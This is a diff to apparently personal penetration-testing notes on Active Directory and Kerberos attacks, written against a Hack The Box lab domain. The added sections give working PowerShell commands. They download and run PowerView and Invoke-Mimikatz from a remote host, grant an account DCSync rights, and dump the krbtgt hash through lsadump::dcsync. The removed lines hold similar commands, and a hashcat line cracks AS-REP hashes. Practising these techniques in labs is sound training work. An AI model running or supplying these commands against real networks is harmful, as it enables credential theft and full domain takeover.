@@ -172,10 +172,31 @@ A protocol that defines how clients interact with a network authentication servi
 7. Server validates access, generates a Ticket (sometimes called session key) for the resource, signs it with the resources private key and sends it back to the client
 8. The client connects to the network resource, sends the ticket, it decrypts with it's private key, validates and grants access.
 
+### Enumeration
+
+Use bloodhound and PowerView.ps1 to explore accounts and permissions.
+Pay attention to ACLs/ACEs in AD, if we have write or edit permissions on AD Objects we can often set passwords or add rights (DCSync rights, etc).
+
 ### Kerberos Attacks
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/f6d5221a8576125a07f42e08c591298335fef256/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting
+```
+
+### Editing AD ACL/ACES 
+
+```
+IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/PowerView.ps1")
+Add-DomainObjectAcl -TargetDomain htb.local -PrincipalIdentity huwwp -Rights DCSync
+```
+
+### DCSync Attack
+
+If an account has DCSync rights we can force the Domain Controller to sync with us and provide us any users password/hashes.
+
+```
+>> IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/Invoke-Mimikatz.ps1")
+>> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:htb.local /user:krbtgt"'
 ```
 
 #### Pass the Tickets
@@ -192,19 +213,12 @@ Clean up file then
 
 hashcat -m 18200 --force -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
 ```
+
 #### Silver Tickets
 
 #### Golden Tickets
-```
-Invoke-Expression (New-Object Net.Webclient).downloadstring('http://10.10.10.10:8000/Invoke-Mimikatz.ps1')
 
-Either dsync or lsa dump for krbtgt NTLM hash
-
-lsadump::dcsync /user:krbtgt
-lsadump::lsa /inject /name:krbtgt
-```
----
-
+####
 
 ## Useful Tools
 
@@ -235,7 +249,7 @@ Download zip and drag into Bloodhound window.
 
 ### Powersploit
 
-A whole bunch of enumeration and priv-esc Powershell scripts.
+A whole bunch of enumeration and priv-esc Powershell scripts. Make sure to get the dev branch.
 
 ### Nishang
 
